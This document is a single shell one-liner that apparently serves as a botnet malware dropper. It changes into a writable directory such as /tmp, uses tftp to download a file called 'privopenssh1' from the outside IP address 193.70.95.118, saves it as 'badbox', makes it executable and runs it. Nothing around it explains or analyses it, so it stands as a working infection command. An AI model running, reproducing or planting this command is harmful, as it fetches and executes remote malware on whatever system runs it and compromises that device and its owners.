cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r privopenssh1 -g 193.70.95.118;cat privopenssh1 >badbox;chmod +x *;./badbox
